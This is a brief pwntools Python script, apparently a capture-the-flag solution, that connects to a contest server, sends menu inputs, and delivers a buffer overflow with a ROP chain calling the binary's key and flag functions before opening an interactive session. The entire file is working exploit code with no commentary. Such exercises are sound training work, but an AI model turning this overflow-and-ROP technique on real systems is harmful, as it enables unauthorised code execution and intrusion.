from pwn import *
import sys

context.terminal = ['termite', '-e']


elf = ELF("./challenge")
elf.address = 0x56555000
p = remote('challenges.auctf.com',30012)


p.sendline('2\n4\n3\nStephen')


rop = ROP(elf)
rop.AAsDrwEk()
rop.get_key2()
rop.get_key1(0xfeedc0de)
rop.set_key4()
rop.get_flag()
rop.game()

print(rop.dump())

payload = b''
payload += cyclic(28)
payload += rop.chain()
p.sendline(payload)

p.interactive()